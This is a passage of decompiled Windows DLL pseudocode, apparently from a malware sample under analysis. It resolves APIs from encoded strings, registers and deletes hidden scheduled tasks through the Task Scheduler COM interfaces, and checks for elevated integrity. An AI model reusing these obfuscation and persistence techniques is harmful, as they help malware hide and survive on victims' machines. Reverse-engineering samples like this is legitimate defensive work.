    "            CloseHandle(*(HANDLE *)&ProcessInformation[8]);",
    "            return 1;",
    "          }",
    "LABEL_19:",
    "          DeleteFileW(TempFileName);",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return ProcessW;",
    "}",
    "",
    "",
    "void sub_62747270()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  const CHAR *v1; // rbx",
    "  const CHAR *v2; // rbx",
    "  const CHAR *v3; // rbx",
    "  const WCHAR *v4; // rbx",
    "  const CHAR *v5; // rbx",
    "  const CHAR *v6; // rbx",
    "  const CHAR *v7; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "",
    "  if ( !dword_62751200 )",
    "  {",
    "    if ( qword_627511F8 )",
    "    {",
    "      if ( qword_627511F0 )",
    "        goto LABEL_4;",
    "    }",
    "    else",
    "    {",
    "      v0 = (const WCHAR *)sub_62746BA0(dword_6274DAB0);",
    "      qword_627511F8 = LoadLibraryW(v0);",
    "      sub_62746C30((__int64)v0);",
    "      if ( qword_627511F0 )",
    "      {",
    "LABEL_4:",
    "        if ( qword_627511E8 )",
    "          goto LABEL_5;",
    "        goto LABEL_16;",
    "      }",
    "    }",
    "    v1 = (const CHAR *)sub_62746B10(dword_6274DAD1);",
    "    qword_627511F0 = (__int64)GetProcAddress(qword_627511F8, v1);",
    "    sub_62746C30((__int64)v1);",
    "    if ( qword_627511E8 )",
    "    {",
    "LABEL_5:",
    "      if ( qword_627511E0 )",
    "        goto LABEL_6;",
    "      goto LABEL_17;",
    "    }",
    "LABEL_16:",
    "    v2 = (const CHAR *)sub_62746B10(dword_6274DAE6);",
    "    qword_627511E8 = (__int64)GetProcAddress(qword_627511F8, v2);",
    "    sub_62746C30((__int64)v2);",
    "    if ( qword_627511E0 )",
    "    {",
    "LABEL_6:",
    "      if ( qword_627511D8 )",
    "        goto LABEL_7;",
    "      goto LABEL_18;",
    "    }",
    "LABEL_17:",
    "    v3 = (const CHAR *)sub_62746B10(dword_6274DB03);",
    "    qword_627511E0 = (__int64)GetProcAddress(qword_627511F8, v3);",
    "    sub_62746C30((__int64)v3);",
    "    if ( qword_627511D8 )",
    "    {",
    "LABEL_7:",
    "      if ( qword_627511D0 )",
    "        goto LABEL_8;",
    "      goto LABEL_19;",
    "    }",
    "LABEL_18:",
    "    v4 = (const WCHAR *)sub_62746BA0(dword_6274DB20);",
    "    qword_627511D8 = LoadLibraryW(v4);",
    "    sub_62746C30((__int64)v4);",
    "    if ( qword_627511D0 )",
    "    {",
    "LABEL_8:",
    "      if ( qword_627511C8 )",
    "        goto LABEL_9;",
    "      goto LABEL_20;",
    "    }",
    "LABEL_19:",
    "    v5 = (const CHAR *)sub_62746B10(dword_6274DB3B);",
    "    qword_627511D0 = (__int64)GetProcAddress(qword_627511D8, v5);",
    "    sub_62746C30((__int64)v5);",
    "    if ( qword_627511C8 )",
    "    {",
    "LABEL_9:",
    "      if ( qword_627511C0 )",
    "        goto LABEL_10;",
    "      goto LABEL_21;",
    "    }",
    "LABEL_20:",
    "    v6 = (const CHAR *)sub_62746B10(dword_6274DB52);",
    "    qword_627511C8 = (__int64)GetProcAddress(qword_627511D8, v6);",
    "    sub_62746C30((__int64)v6);",
    "    if ( qword_627511C0 )",
    "    {",
    "LABEL_10:",
    "      if ( qword_627511B8 )",
    "        goto LABEL_11;",
    "      goto LABEL_22;",
    "    }",
    "LABEL_21:",
    "    v7 = (const CHAR *)sub_62746B10(dword_6274DB6B);",
    "    qword_627511C0 = (__int64)GetProcAddress(qword_627511D8, v7);",
    "    sub_62746C30((__int64)v7);",
    "    if ( qword_627511B8 )",
    "    {",
    "LABEL_11:",
    "      if ( qword_627511B0 )",
    "      {",
    "LABEL_12:",
    "        ++dword_62751200;",
    "        return;",
    "      }",
    "LABEL_23:",
    "      v9 = (const CHAR *)sub_62746B10(dword_6274DBA7);",
    "      qword_627511B0 = (__int64)GetProcAddress(qword_627511B8, v9);",
    "      sub_62746C30((__int64)v9);",
    "      goto LABEL_12;",
    "    }",
    "LABEL_22:",
    "    v8 = (const WCHAR *)sub_62746BA0(dword_6274DB88);",
    "    qword_627511B8 = LoadLibraryW(v8);",
    "    sub_62746C30((__int64)v8);",
    "    if ( qword_627511B0 )",
    "      goto LABEL_12;",
    "    goto LABEL_23;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747580(__int64 a1, int a2)",
    "{",
    "  __int64 v5; // [rsp+28h] [rbp-40h] BYREF",
    "  _BYTE v6[56]; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  qword_627511F0(v6);",
    "  qword_627511E0(v6, &v5);",
    "  v5 += (unsigned int)(10000000 * a2);",
    "  return qword_627511E8(&v5, a1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627475F0(_QWORD *a1)",
    "{",
    "  unsigned int i; // ebx",
    "  unsigned int v3; // esi",
    "  _QWORD *v4; // rbp",
    "  wchar_t *v5; // rsi",
    "  unsigned int j; // esi",
    "  unsigned int v8; // [rsp+34h] [rbp-44h] BYREF",
    "  LPVOID pv; // [rsp+38h] [rbp-40h] BYREF",
    "  __int64 v10; // [rsp+40h] [rbp-38h] BYREF",
    "  _QWORD v11[6]; // [rsp+48h] [rbp-30h] BYREF",
    "",
    "  sub_62747270();",
    "  i = 0;",
    "  if ( (int)qword_627511D0(0, 0) >= 0 )",
    "  {",
    "    if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, v11) >= 0 )",
    "    {",
    "      if ( (*(int (__fastcall **)(_QWORD, __int64 *))(*(_QWORD *)v11[0] + 40LL))(v11[0], &v10) >= 0 )",
    "      {",
    "        v8 = 0;",
    "        if ( (*(int (__fastcall **)(__int64, __int64, LPVOID *, unsigned int *))(*(_QWORD *)v10 + 24LL))(",
    "               v10,",
    "               0xFFFFFFFFLL,",
    "               &pv,",
    "               &v8) >= 0",
    "          && v8 )",
    "        {",
    "          v3 = 0;",
    "          do",
    "            v3 += ((2 * wcslen(*((const wchar_t **)pv + i++)) + 9) & 0xFFFFFFF8) + 8;",
    "          while ( v8 > i );",
    "          v4 = sub_62745B80(v3 + 8LL);",
    "          i = 0;",
    "          if ( v4 )",
    "          {",
    "            i = v8;",
    "            v5 = (wchar_t *)&v4[v8 + 1];",
    "            if ( v8 )",
    "            {",
    "              for ( i = 0; i < v8; ++i )",
    "              {",
    "                v4[i] = v5;",
    "                wcscpy(v5, *((const wchar_t **)pv + i));",
    "                v5 = (wchar_t *)((char *)v5 + ((2 * wcslen(v5) + 9) & 0xFFFFFFFFFFFFFFF8uLL));",
    "              }",
    "            }",
    "            v4[i] = 0;",
    "            *a1 = v4;",
    "          }",
    "          if ( v8 )",
    "          {",
    "            for ( j = 0; j < v8; ++j )",
    "              CoTaskMemFree(*((LPVOID *)pv + j));",
    "          }",
    "          CoTaskMemFree(pv);",
    "        }",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 16LL))(v10);",
    "      }",
    "      (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v11[0] + 16LL))(v11[0]);",
    "    }",
    "    qword_627511C0();",
    "  }",
    "  return i;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627477A0(WCHAR *String)",
    "{",
    "  int v2; // eax",
    "  unsigned int v3; // ebx",
    "  __int64 v4; // rdi",
    "  unsigned __int64 v5; // rbx",
    "  size_t v6; // rax",
    "  LPWSTR lpMem; // [rsp+28h] [rbp-20h] BYREF",
    "",
    "  lpMem = 0;",
    "  v2 = sub_627475F0(&lpMem);",
    "  v3 = v2;",
    "  if ( v2 )",
    "  {",
    "    if ( v2 <= 0 )",
    "    {",
    "      v3 = 0;",
    "    }",
    "    else",
    "    {",
    "      v4 = 8LL * (unsigned int)(v2 - 1) + 8;",
    "      v5 = 0;",
    "      do",
    "      {",
    "        v6 = wcslen(String);",
    "        if ( !wcsncmp(*(const wchar_t **)&lpMem[v5 / 2], String, v6) )",
    "        {",
    "          v3 = 1;",
    "          goto LABEL_7;",
    "        }",
    "        v5 += 8LL;",
    "      }",
    "      while ( v5 != v4 );",
    "      v3 = 0;",
    "    }",
    "LABEL_7:",
    "    sub_62745BE0(lpMem);",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747840(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned int a5)",
    "{",
    "  unsigned int v9; // esi",
    "  int v11; // [rsp+3Ch] [rbp-29Ch] BYREF",
    "  wchar_t Destination[256]; // [rsp+40h] [rbp-298h] BYREF",
    "  int v13; // [rsp+240h] [rbp-98h] BYREF",
    "  unsigned __int16 v14; // [rsp+246h] [rbp-92h]",
    "  unsigned int v15; // [rsp+248h] [rbp-90h]",
    "  _BYTE v16[2]; // [rsp+25Eh] [rbp-7Ah] BYREF",
    "  __int64 v17; // [rsp+260h] [rbp-78h] BYREF",
    "  __int64 v18; // [rsp+268h] [rbp-70h]",
    "  __int64 v19; // [rsp+270h] [rbp-68h]",
    "  __int64 v20; // [rsp+278h] [rbp-60h]",
    "  __int64 v21; // [rsp+280h] [rbp-58h]",
    "  __int64 v22; // [rsp+288h] [rbp-50h]",
    "  __int64 v23; // [rsp+290h] [rbp-48h] BYREF",
    "  __int64 v24; // [rsp+298h] [rbp-40h] BYREF",
    "  __int64 v25; // [rsp+2A0h] [rbp-38h] BYREF",
    "  _QWORD v26[6]; // [rsp+2A8h] [rbp-30h] BYREF",
    "",
    "  sub_62747270();",
    "  qword_627511D0(0, 2);",
    "  v9 = 0;",
    "  if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, v26) >= 0 )",
    "  {",
    "    if ( (*(int (__fastcall **)(_QWORD, __int64, void *, void *, __int64 *))(*(_QWORD *)v26[0] + 64LL))(",
    "           v26[0],",
    "           a1,",
    "           &unk_6274DBD0,",
    "           &unk_6274E080,",
    "           &v25) >= 0 )",
    "    {",
    "      if ( (*(int (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 224LL))(v25, 0x2000) >= 0",
    "        && (*(int (__fastcall **)(__int64, _BYTE *, __int64 *))(*(_QWORD *)v25 + 24LL))(v25, v16, &v24) >= 0 )",
    "      {",
    "        v17 = 0;",
    "        v18 = 0;",
    "        v19 = 0;",
    "        v20 = 0;",
    "        v21 = 0;",
    "        v22 = 0;",
    "        sub_62747580((__int64)&v13, a4);",
    "        LODWORD(v17) = 48;",
    "        v18 = v14;",
    "        HIDWORD(v17) = v13;",
    "        v19 = v15 | 0x5A000000000LL;",
    "        v20 = a5;",
    "        LODWORD(v21) = 1;",
    "        WORD2(v21) = 1;",
    "        HIDWORD(v22) = 0;",
    "        if ( (*(int (__fastcall **)(__int64, __int64 *))(*(_QWORD *)v24 + 24LL))(v24, &v17) >= 0",
    "          && (**(int (__fastcall ***)(__int64, void *, __int64 *))v25)(v25, &unk_6274E070, &v23) >= 0 )",
    "        {",
    "          if ( (unsigned int)sub_62747EE0() > 0x2FFF )",
    "          {",
    "            wcscpy(Destination, &word_6274DBBE);",
    "          }",
    "          else",
    "          {",
    "            v11 = 256;",
    "            qword_627511B0(2, Destination, &v11);",
    "          }",
    "          (*(void (__fastcall **)(__int64, wchar_t *, _QWORD))(*(_QWORD *)v25 + 240LL))(v25, Destination, 0);",
    "          (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 256LL))(v25, a2);",
    "          if ( a3 )",
    "            (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 272LL))(v25, a3);",
    "          (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 336LL))(v25, 3596400000LL);",
    "          (*(void (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)v23 + 48LL))(v23, 0, 1);",
    "          (*(void (__fastcall **)(__int64))(*(_QWORD *)v23 + 16LL))(v23);",
    "          v9 = 1;",
    "        }",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v24 + 16LL))(v24);",
    "      }",
    "      (*(void (__fastcall **)(__int64))(*(_QWORD *)v25 + 16LL))(v25);",
    "    }",
    "    (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v26[0] + 16LL))(v26[0]);",
    "  }",
    "  qword_627511C0();",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747BA0(__int64 a1)",
    "{",
    "  unsigned int v2; // esi",
    "  int v3; // edi",
    "  __int64 v5; // [rsp+38h] [rbp-40h] BYREF",
    "  __int64 v6; // [rsp+40h] [rbp-38h] BYREF",
    "  _DWORD v7[11]; // [rsp+4Ch] [rbp-2Ch] BYREF",
    "",
    "  sub_62747270();",
    "  qword_627511D0(0, 2);",
    "  v2 = 0;",
    "  if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, &v6) >= 0 )",
    "  {",
    "    v3 = 60;",
    "    do",
    "    {",
    "      if ( (*(int (__fastcall **)(__int64, __int64, void *, __int64 *))(*(_QWORD *)v6 + 48LL))(",
    "             v6,",
    "             a1,",
    "             &unk_6274E080,",
    "             &v5) < 0 )",
    "      {",
    "        v2 = 0;",
    "        goto LABEL_5;",
    "      }",
    "      if ( (*(int (__fastcall **)(__int64, _DWORD *))(*(_QWORD *)v5 + 128LL))(v5, v7) >= 0 && v7[0] == 267009 )",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 104LL))(v5);",
    "      if ( (*(int (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 56LL))(v6, a1) >= 0 )",
    "      {",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "        v2 = 1;",
    "        goto LABEL_5;",
    "      }",
    "      (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "      Sleep(0x3E8u);",
    "      --v3;",
    "    }",
    "    while ( v3 );",
    "    v2 = 0;",
    "LABEL_5:",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 16LL))(v6);",
    "  }",
    "  qword_627511C0();",
    "  return v2;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_62747CC0(OLECHAR *psz)",
    "{",
    "  BOOL v2; // esi",
    "  OLECHAR *v4; // rdi",
    "  BSTR v5; // rax",
    "  __m128i v6; // [rsp+30h] [rbp-128h] BYREF",
    "  IRecordInfo *v7; // [rsp+40h] [rbp-118h]",
    "  __m128i v8; // [rsp+50h] [rbp-108h] BYREF",
    "  IRecordInfo *v9; // [rsp+60h] [rbp-F8h]",
    "  __m128i v10; // [rsp+70h] [rbp-E8h] BYREF",
    "  IRecordInfo *v11; // [rsp+80h] [rbp-D8h]",
    "  __m128i si128; // [rsp+90h] [rbp-C8h] BYREF",
    "  IRecordInfo *pRecInfo; // [rsp+A0h] [rbp-B8h]",
    "  VARIANTARG v14; // [rsp+B0h] [rbp-A8h] BYREF",
    "  VARIANTARG v15; // [rsp+D0h] [rbp-88h] BYREF",
    "  VARIANTARG v16; // [rsp+F0h] [rbp-68h] BYREF",
    "  VARIANTARG pvarg; // [rsp+110h] [rbp-48h] BYREF",
    "  __int64 v18; // [rsp+130h] [rbp-28h] BYREF",
    "  LPWSTR ppv; // [rsp+138h] [rbp-20h] BYREF",
    "",
    "  v2 = 0;",
    "  if ( CoInitializeEx(0, 0) < 0 )",
    "    return 0;",
    "  if ( CoCreateInstance(&stru_6274E060, 0, 1u, &stru_6274E0A0, (LPVOID *)&ppv) >= 0 )",
    "  {",
    "    VariantInit(&pvarg);",
    "    VariantInit(&v16);",
    "    VariantInit(&v15);",
    "    VariantInit(&v14);",
    "    si128 = _mm_load_si128((const __m128i *)&pvarg);",
    "    pRecInfo = pvarg.pRecInfo;",
    "    v10 = _mm_load_si128((const __m128i *)&v16);",
    "    v11 = v16.pRecInfo;",
    "    v8 = _mm_load_si128((const __m128i *)&v15);",
    "    v9 = v15.pRecInfo;",
    "    v6 = _mm_load_si128((const __m128i *)&v14);",
    "    v7 = v14.pRecInfo;",
    "    v2 = 0;",
    "    if ( (*(int (__fastcall **)(LPWSTR, __m128i *, __m128i *, __m128i *, __m128i *))(*(_QWORD *)ppv + 80LL))(",
    "           ppv,",
    "           &si128,",
    "           &v10,",
    "           &v8,",
    "           &v6) >= 0 )",
    "    {",
    "      v4 = SysAllocString(&::psz);",
    "      if ( (*(int (__fastcall **)(LPWSTR, OLECHAR *, __int64 *))(*(_QWORD *)ppv + 56LL))(ppv, v4, &v18) >= 0 )",
    "      {",
    "        v5 = SysAllocString(psz);",
    "        v2 = (*(int (__fastcall **)(__int64, BSTR, _QWORD))(*(_QWORD *)v18 + 120LL))(v18, v5, 0) >= 0;",
    "        SysFreeString(v4);",
    "      }",
    "      SysFreeString(v4);",
    "    }",
    "    VariantClear(&v14);",
    "    VariantClear(&v15);",
    "    VariantClear(&v16);",
    "    VariantClear(&pvarg);",
    "    (*(void (__fastcall **)(LPWSTR))(*(_QWORD *)ppv + 16LL))(ppv);",
    "  }",
    "  CoUninitialize();",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 sub_62747EE0()",
    "{",
    "  unsigned int (__fastcall *v0)(__int64, __int64, _DWORD *); // rbx",
    "  __int64 v1; // rax",
    "  unsigned int v2; // esi",
    "  _QWORD *v3; // rbx",
    "  __int64 (__fastcall *v4)(_QWORD, _QWORD); // rsi",
    "  _BYTE *v5; // rax",
    "  const WCHAR *v7; // rbx",
    "  const CHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  const CHAR *v12; // rbx",
    "  const CHAR *v13; // rbx",
    "  const CHAR *v14; // rbx",
    "  _DWORD dwBytes[9]; // [rsp+34h] [rbp-24h] BYREF",
    "",
    "  if ( qword_62751260 )",
    "  {",
    "    if ( qword_62751250 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v7 = (const WCHAR *)sub_62746BA0(dword_6274DBF0);",
    "    qword_62751260 = LoadLibraryW(v7);",
    "    sub_62746C30((__int64)v7);",
    "    if ( qword_62751250 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751248 )",
    "        goto LABEL_4;",
    "      goto LABEL_18;",
    "    }",
    "  }",
    "  v8 = (const CHAR *)sub_62746B10(dword_6274DC11);",
    "  qword_62751250 = GetProcAddress(qword_62751260, v8);",
    "  sub_62746C30((__int64)v8);",
    "  if ( qword_62751248 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751240 )",
    "      goto LABEL_5;",
    "    goto LABEL_19;",
    "  }",
    "LABEL_18:",
    "  v9 = (const CHAR *)sub_62746B10(dword_6274DC2B);",
    "  qword_62751248 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751260, v9);",
    "  sub_62746C30((__int64)v9);",
    "  if ( qword_62751240 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751238 )",
    "      goto LABEL_6;",
    "    goto LABEL_20;",
    "  }",
    "LABEL_19:",
    "  v10 = (const WCHAR *)sub_62746BA0(dword_6274DC40);",
    "  qword_62751240 = LoadLibraryW(v10);",
    "  sub_62746C30((__int64)v10);",
    "  if ( qword_62751238 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751230 )",
    "      goto LABEL_7;",
    "    goto LABEL_21;",
    "  }",
    "LABEL_20:",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DC61);",
    "  qword_62751238 = (__int64)GetProcAddress(qword_62751240, v11);",
    "  sub_62746C30((__int64)v11);",
    "  if ( qword_62751230 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751228 )",
    "      goto LABEL_8;",
    "LABEL_22:",
    "    v13 = (const CHAR *)sub_62746B10(dword_6274DC98);",
    "    qword_62751228 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751240, v13);",
    "    sub_62746C30((__int64)v13);",
    "    if ( qword_62751220 )",
    "      goto LABEL_9;",
    "    goto LABEL_23;",
    "  }",
    "LABEL_21:",
    "  v12 = (const CHAR *)sub_62746B10(dword_6274DC7A);",
    "  qword_62751230 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751240, v12);",
    "  sub_62746C30((__int64)v12);",
    "  if ( !qword_62751228 )",
    "    goto LABEL_22;",
    "LABEL_8:",
    "  if ( qword_62751220 )",
    "    goto LABEL_9;",
    "LABEL_23:",
    "  v14 = (const CHAR *)sub_62746B10(dword_6274DCB8);",
    "  qword_62751220 = (__int64)GetProcAddress(qword_62751240, v14);",
    "  sub_62746C30((__int64)v14);",
    "LABEL_9:",
    "  v0 = (unsigned int (__fastcall *)(__int64, __int64, _DWORD *))qword_62751238;",
    "  v1 = qword_62751250();",
    "  v2 = 0;",
    "  if ( v0(v1, 24, &dwBytes[1]) )",
    "  {",
    "    dwBytes[0] = 0;",
    "    qword_62751230(*(_QWORD *)&dwBytes[1], 25, 0, 0, dwBytes);",
    "    v3 = sub_62745B80(dwBytes[0]);",
    "    if ( v3 )",
    "    {",
    "      if ( (unsigned int)qword_62751230(*(_QWORD *)&dwBytes[1], 25, v3, dwBytes[0], dwBytes) )",
    "      {",
    "        v4 = (__int64 (__fastcall *)(_QWORD, _QWORD))qword_62751220;",
    "        v5 = (_BYTE *)qword_62751228(*v3);",
    "        v2 = *(_DWORD *)v4(*v3, (unsigned __int8)(*v5 - 1));",
    "      }",
    "      sub_62745BE0(v3);",
    "    }",
    "    qword_62751248(*(_QWORD *)&dwBytes[1]);",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "_BOOL8 sub_62748210()",
    "{",
    "  return (unsigned int)sub_62747EE0() > 0x2FFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748230(WCHAR *String2)",
    "{",
    "  __int64 (__fastcall *v2)(__int64, int *); // rbx",
    "  __int64 v3; // rax",
    "  const wchar_t **v4; // rsi",
    "  unsigned int v5; // ebx",
    "  __int64 v6; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  int v12[7]; // [rsp+2Ch] [rbp-1Ch] BYREF",
    "",
    "  if ( qword_62751260 )",
    "  {",
    "    if ( qword_62751258 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v8 = (const WCHAR *)sub_62746BA0(dword_6274DCD8);",
    "    qword_62751260 = LoadLibraryW(v8);",
    "    sub_62746C30((__int64)v8);",
    "    if ( qword_62751258 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751218 )",
    "        goto LABEL_4;",
    "LABEL_16:",
    "      v10 = (const WCHAR *)sub_62746BA0(dword_6274DD18);",
    "      qword_62751218 = LoadLibraryW(v10);",
    "      sub_62746C30((__int64)v10);",
    "      if ( qword_62751210 )",
    "        goto LABEL_5;",
    "      goto LABEL_17;",
    "    }",
    "  }",
    "  v9 = (const CHAR *)sub_62746B10(dword_6274DCF9);",
    "  qword_62751258 = GetProcAddress(qword_62751260, v9);",
    "  sub_62746C30((__int64)v9);",
    "  if ( !qword_62751218 )",
    "    goto LABEL_16;",
    "LABEL_4:",
    "  if ( qword_62751210 )",
    "    goto LABEL_5;",
    "LABEL_17:",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DD37);",
    "  qword_62751210 = (__int64)GetProcAddress(qword_62751218, v11);",
    "  sub_62746C30((__int64)v11);",
    "LABEL_5:",
    "  v2 = (__int64 (__fastcall *)(__int64, int *))qword_62751210;",
    "  v3 = qword_62751258();",
    "  v4 = (const wchar_t **)v2(v3, v12);",
    "  v5 = 0;",
    "  if ( v4 )",
    "  {",
    "    if ( v12[0] > 1 )",
    "    {",
    "      v6 = 1;",
    "      do",
    "      {",
    "        if ( !wcscmp(v4[v6], String2) )",
    "        {",
    "          v5 = 1;",
    "          goto LABEL_11;",
    "        }",
    "        ++v6;",
    "      }",
    "      while ( v12[0] > (int)v6 );",
    "      v5 = 0;",
    "    }",
    "LABEL_11:",
    "    LocalFree(v4);",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 sub_627483E0()",
    "{",
    "  WCHAR *v0; // rbx",
    "  unsigned int v1; // esi",
    "",
    "  v0 = (WCHAR *)sub_62746BA0(dword_6274DD52);",
    "  v1 = sub_62748230(v0);",
    "  sub_62746C30((__int64)v0);",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748410(__int64 a1)",
    "{",
    "  return ((int)*(unsigned __int16 *)(*(int *)(a1 + 60) + a1 + 22) >> 13) & 1;",
    "}",
    "",
    "",
    "void (*sub_62748420())(void)",
    "{",
    "  void (*result)(void); // rax",
    "",
    "  result = (void (*)(void))(*off_6274A660)[0];",
    "  if ( (*off_6274A660)[0] )",
    "  {",
    "    do",
    "    {",
    "      result();",
    "      result = (void (*)(void))(*off_6274A660)[1];",
    "      off_6274A660 = (__int64 (*)[38])((char *)off_6274A660 + 8);",
    "    }",
    "    while ( result );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_62748460()",
    "{",
    "  void (**v0)(void); // rbx",
    "  __int64 *v1; // rsi",
    "  unsigned int v2; // eax",
    "  unsigned int v3; // ecx",
    "",
    "  v2 = 0;",
    "  do",
    "    v3 = v2++;",
    "  while ( qword_62749AB0[v2] );",
    "  if ( v3 )",
    "  {",
    "    v0 = (void (**)(void))&qword_62749AB0[v3];",
    "    v1 = &qword_62749AB0[v3 - (unsigned __int64)(v3 - 1) - 1];",
    "    do",
    "      (*v0--)();",
    "    while ( v0 != (void (**)(void))v1 );",
    "  }",
    "  JUMPOUT(0x627413A0);",
    "}",
    "",
    "",
    "void sub_627484D0()",
    "{",
    "  if ( !dword_62751270 )",
    "  {",
    "    dword_62751270 = 1;",
    "    sub_62748460();",
    "  }",
    "}",
    "",
    "",
    "LONGLONG sub_627484F0()",
    "{",
    "  LONGLONG result; // rax",
    "  struct _FILETIME v1; // rsi",
    "  DWORD CurrentProcessId; // ebp",
    "  DWORD CurrentThreadId; // edi",
    "  DWORD TickCount; // r12d",
    "  unsigned __int64 v5; // rdx",
    "  struct _FILETIME SystemTimeAsFileTime; // [rsp+20h] [rbp-38h] BYREF",
    "  LARGE_INTEGER PerformanceCount[6]; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  result = 0x2B992DDFA232LL;",
    "  SystemTimeAsFileTime = 0;",
    "  if ( qword_6274A690 == 0x2B992DDFA232LL )",
    "  {",
    "    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);",
    "    v1 = SystemTimeAsFileTime;",
    "    CurrentProcessId = GetCurrentProcessId();",
    "    CurrentThreadId = GetCurrentThreadId();",
    "    TickCount = GetTickCount();",
    "    QueryPerformanceCounter(PerformanceCount);",
    "    result = (PerformanceCount[0].QuadPart",
    "            ^ *(_QWORD *)&v1",
    "            ^ CurrentProcessId",
    "            ^ CurrentThreadId",
    "            ^ TickCount)",
    "           & 0xFFFFFFFFFFFFLL;",
    "    if ( result == 0x2B992DDFA232LL )",
    "    {",
    "      v5 = 0xFFFFD466D2205DCCuLL;",
    "      result = 0x2B992DDFA233LL;",
    "    }",
    "    else",
    "    {",
    "      v5 = ~result;",
    "    }",
    "    qword_6274A690 = result;",
    "    qword_6274A6A0 = v5;",
    "  }",
    "  else",
    "  {",
    "    qword_6274A6A0 = ~qword_6274A690;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall  sub_627485D0(DWORD64 a1)",
    "{",
    "  ULONG64 Rip; // rsi",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; // r9",
    "  HANDLE CurrentProcess; // rax",
    "  unsigned __int64 ImageBase; // [rsp+48h] [rbp-28h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+50h] [rbp-20h] BYREF",
    "  PVOID HandlerData[4]; // [rsp+58h] [rbp-18h] BYREF",
    "  char vars8; // [rsp+78h] [rbp+8h] BYREF",
    "  DWORD64 retaddr; // [rsp+88h] [rbp+18h]",
    "",
    "  RtlCaptureContext(&ContextRecord);",
    "  Rip = ContextRecord.Rip;",
    "  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0);",
    "  if ( v3 )",
    "  {",
    "    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, HandlerData, &EstablisherFrame, 0);",
    "  }",
    "  else",
    "  {",
    "    ContextRecord.Rip = retaddr;",
    "    ContextRecord.Rsp = (DWORD64)&vars8;",
    "  }",
    "  ContextRecord.Rcx = a1;",
    "  qword_62751770 = ContextRecord.Rip;",
    "  qword_62751760 = 0x1C0000409LL;",
    "  HandlerData[1] = (PVOID)qword_6274A690;",
    "  HandlerData[2] = (PVOID)qword_6274A6A0;",
    "  SetUnhandledExceptionFilter(0);",
    "  UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "  CurrentProcess = GetCurrentProcess();",
    "  TerminateProcess(CurrentProcess, 0xC0000409);",
    "  abort();",
    "}",
    "",
    "",
    "__int64 __fastcall TlsCallback_1(__int64 a1, int a2)",
    "{",
    "  if ( a2 != 3 && a2 )",
    "    return 1;",
    "  sub_62749300();",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall TlsCallback_0(__int64 a1, int a2)",
    "{",
    "  if ( unk_6274A680 != 2 )",
    "    unk_6274A680 = 2;",
    "  if ( a2 == 1 )",
    "    sub_62749300();",
    "  return 1;",
    "}",
    "",
    "",
    "void  sub_627487A0(char *Format, ...)",
    "{",
    "  FILE *v2; // rax",
    "  FILE *v3; // rax",
    "  va_list va; // [rsp+58h] [rbp+10h] BYREF",
    "",
    "  va_start(va, Format);",
    "  v2 = (FILE *)sub_62749A60(2);",
